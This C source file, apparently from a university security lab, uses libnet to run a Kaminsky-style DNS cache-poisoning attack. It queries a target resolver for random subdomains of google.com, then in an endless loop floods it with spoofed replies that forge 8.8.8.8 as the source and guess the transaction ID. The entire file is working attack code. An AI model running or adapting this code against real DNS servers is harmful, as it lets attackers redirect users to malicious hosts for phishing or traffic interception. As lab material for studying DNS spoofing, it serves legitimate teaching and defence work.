/*		    GNU GENERAL PUBLIC LICENSE
		       Version 2, June 1991
 Copyright (C) 1989, 1991 Free Software Foundation, Inc.,
 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.
*/
#include <libnet.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
    int c;
    u_char *cp;
    libnet_t *l;
    libnet_ptag_t t;
    char errbuf[LIBNET_ERRBUF_SIZE];
    
    char payload_file[FILENAME_MAX] = "";
    char attack_domain[] = "google.com";	// target domain
    //char attack_dns[] = "cis644-dns-attack.google.com";	// fake nameserver
    //char attack_dns_ip[40] = "192.168.0.200";	// attacker's DNS server ip address
    char target_dns_ip[] = "192.168.0.10";	// target dns server which is going to be attacked
    char client_ip[] = "192.168.0.100";		// client dns ip, with which we will sends DNS query
    char real_dns_server[] = "8.8.8.8";	// real DNS server IP
    char dev[] = "eth5";
    //u_long i_attack_dns_ip;
    u_long i_target_dns_ip;
    u_long i_client_ip;
    u_long i_real_dns_server;
    char subdomain_host[50];
    char *payload_location;
    
    int x;
    int y = 0;
    int udp_src_port = 1;       /* UDP source port */
    int udp_des_port = 1;       /* UDP dest port */
    int z;
    int i;
    int payload_filesize = 0;
    u_char eth_saddr[6];	/* NULL Ethernet saddr */
    u_char eth_daddr[6]; 	/* NULL Ethernet daddr */
    u_char eth_caddr[6]; 	/* NULL Ethernet daddr */
    u_char eth_proto[60];       /* Ethernet protocal */
    u_long eth_pktcount;        /* How many packets to send */
    long nap_time;              /* How long to sleep */
    u_char ip_proto[40];
    u_char spa[4]={0x0, 0x0, 0x0, 0x0};
    u_char tpa[4]={0x0, 0x0, 0x0, 0x0};
    u_char *device = NULL;
    u_char i_ttos_val = 0;	/* final or'd value for ip tos */
    u_char i_ttl;		/* IP TTL */
    u_short e_proto_val = 0;    /* final resulting value for eth_proto */
    u_short ip_proto_val = 0;   /* final resulting value for ip_proto */
int
main(int argc, char *argv[])
{
    /*
     *  Initialize the library.  Root priviledges are required.
     */
    l = libnet_init(
            LIBNET_LINK,                             /* injection type */
			dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */
    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s", errbuf);
        exit(EXIT_FAILURE); 
    }
    // get attacker's dns server ip
    //i_attack_dns_ip = libnet_name2addr4(l, attack_dns_ip, LIBNET_RESOLVE);
    i_target_dns_ip = libnet_name2addr4(l, target_dns_ip, LIBNET_RESOLVE);
    i_client_ip = libnet_name2addr4(l, client_ip, LIBNET_RESOLVE);
    i_real_dns_server = libnet_name2addr4(l, real_dns_server, LIBNET_RESOLVE);
    // server mac
    sscanf("00, 00, 00, 00, 01, 22", "%x, %x, %x, %x, %x, %x", &eth_saddr[0], &eth_saddr[1], &eth_saddr[2], &eth_saddr[3], &eth_saddr[4], &eth_saddr[5]);
    // gateway mac
    sscanf("00, 00, 00, 00, 00, 01", "%x, %x, %x, %x, %x, %x", &eth_daddr[0], &eth_daddr[1], &eth_daddr[2], &eth_daddr[3], &eth_daddr[4], &eth_daddr[5]);
    // client mac
    sscanf("00, 00, 00, 00, 01, 23", "%x, %x, %x, %x, %x, %x", &eth_caddr[0], &eth_caddr[1], &eth_caddr[2], &eth_caddr[3], &eth_caddr[4], &eth_caddr[5]);
srand((int)time(0));	// init random seed
while (1==1)  /* setup fake loop to begin infinit loop. This is on purpose because I'm a moron. :-) */
{
    // first generate a random domain
    // note the first dot
	int randomNumber = (rand()%10000000);
	while (randomNumber<1000000) randomNumber*=10;
    sprintf(subdomain_host, ".x-%d.%s", randomNumber,attack_domain);
    printf("\nNow attacking with domain %s \n",subdomain_host);
    convertDomain();
// query attack ----------------------------------------------------------------------------------
	    load_payload_query();
	    // always builds UDP
	    t = libnet_build_udp(
		    33333,                                /* source port */
		    53,                                /* destination port */
		    LIBNET_UDP_H + payload_filesize,           /* packet length */
		    0,                                         /* checksum */
		    payload_location,                          /* payload */
		    payload_filesize,                          /* payload size */
		    l,                                         /* libnet handle */
		    0);                                        /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_UDP_H + payload_filesize,          /* length */
		0,                         /* TOS */
		12345,                                                  /* IP ID */
		IP_DF,                                                /* IP Frag */
		255,                                                 /* TTL */
		IPPROTO_UDP,                                          /* protocol */
		0,                                                     /* checksum */
		i_client_ip,                                            /* source IP */
		i_target_dns_ip,                                            /* destination IP */
		NULL,                                                  /* payload */
		0,                                                     /* payload size */
		l,                                                     /* libnet handle */
		0);                                                    /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    t = libnet_build_ethernet(
		eth_saddr,                                   /* ethernet destination */
		eth_caddr,                                   /* ethernet source */
		ETHERTYPE_IP,                                 /* protocol type */
		NULL,                                        /* payload */
		0,                                           /* payload size */
		l,                                           /* libnet handle */
		0);                                          /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	     /*	
	     *  Write it to the wire.
	     */
        c = libnet_write(l);
        free(payload_location);
    libnet_destroy(l);
    for (i=0;i<30;i++) {	// send 100 fake response, as the server response quite fast
        l = libnet_init(
            LIBNET_LINK,                             /* injection type */
	    dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */
        load_payload_answer();
	    // always builds UDP
	    t = libnet_build_udp(
		    53,                                /* source port */
		    33333,                                /* destination port */
		    LIBNET_UDP_H + payload_filesize,           /* packet length */
		    0,                                         /* checksum */
		    payload_location,                          /* payload */
		    payload_filesize,                          /* payload size */
		    l,                                         /* libnet handle */
		    0);                                        /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build UDP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_UDP_H + payload_filesize,          /* length */
		0,                         /* TOS */
		12345,                                                  /* IP ID */
		IP_DF,                                                /* IP Frag */
		255,                                                 /* TTL */
		IPPROTO_UDP,                                          /* protocol */
		0,                                                     /* checksum */
		i_real_dns_server,                                            /* source IP */
		i_target_dns_ip,                                            /* destination IP */
		NULL,                                                  /* payload */
		0,                                                     /* payload size */
		l,                                                     /* libnet handle */
		0);                                                    /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    t = libnet_build_ethernet(
		eth_saddr,                                   /* ethernet destination */
		eth_daddr,                                   /* ethernet source */
		ETHERTYPE_IP,                                 /* protocol type */
		NULL,                                        /* payload */
		0,                                           /* payload size */
		l,                                           /* libnet handle */
		0);                                          /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build ethernet header: %s\n", libnet_geterror(l));
		goto bad;
	    }
	     /*	
	     *  Write it to the wire.
	     */
        c = libnet_write(l);
        free(payload_location);
        libnet_destroy(l);
    }
    l = libnet_init(
            LIBNET_LINK,                             /* injection type */
	    dev,                                /* network interface eth0, eth1, etc. NULL is default.*/
            errbuf);                                 /* error buffer */
// end ---------------------------------------------------------------
}
printf("****  %d packets sent  **** (packetsize: %d bytes each)\n",eth_pktcount,c);  /* tell them what we just did */
    /* give the buf memory back */
    libnet_destroy(l);
    return (0);
bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);
	    
}
convertDomain() {
    unsigned int len = (unsigned)strlen(subdomain_host);
    int i=0;
    while (len>0) {
        if (subdomain_host[len-1]=='.') {
            subdomain_host[len-1]=i;
            i=0;
        }
        else {
            i++;
        }
        len--;
    }
}
/* load_payload: load the payload into memory */
load_payload_query()
{
    FILE *infile;
    struct stat statbuf;
    int i = 0;
    int j = 0;
    int c = 0;
    unsigned int len = (unsigned)strlen(subdomain_host);
    char payload_file[] = "payload_query2";
    stat(payload_file, &statbuf);
    payload_filesize = statbuf.st_size+len;
    payload_location = (char *)malloc(payload_filesize * sizeof(char));
    if (payload_location == 0)
    {
        printf("Allocation of memory for payload failed.\n");
        exit(0); 
    }
    /* open the file and read it into memory */
    infile = fopen(payload_file, "r");	/* open the payload file read only */
    
    while((c = getc(infile)) != EOF)
    {
        if (i==12) {
            for (j=0;j<len;j++) {
                *(payload_location + i + j) = subdomain_host[j];
            }
            i+=len;
        }
        *(payload_location + i) = c;
        i++;
    }
    fclose(infile);
}
/* load_payload: load the payload into memory */
load_payload_answer()
{
    FILE *infile;
    struct stat statbuf;
    int i = 2;
    int j = 0;
    int c = 0;
    unsigned int len = (unsigned)strlen(subdomain_host);
    char payload_file[] = "payload_answer3";
    //char payload_file[] = "payload_answer2";
    // generate random transaction ID
    int transID[] = {rand()%256,rand()%256};
    stat(payload_file, &statbuf);
    payload_filesize = statbuf.st_size+len+2;
    payload_location = (char *)malloc(payload_filesize * sizeof(char));
    if (payload_location == 0)
    {
        printf("Allocation of memory for payload failed.\n");
        exit(0); 
    }
    *payload_location = transID[0];
    *(payload_location+1) = transID[1];
    /* open the file and read it into memory */
    infile = fopen(payload_file, "r");	/* open the payload file read only */
    
    while((c = getc(infile)) != EOF)
    {
        if (i==12) {
            for (j=0;j<len;j++) {
                *(payload_location + i + j) = subdomain_host[j];
            }
            i+=len;
        }
        *(payload_location + i) = c;
        i++;
    }
    fclose(infile);
}
/* EOF */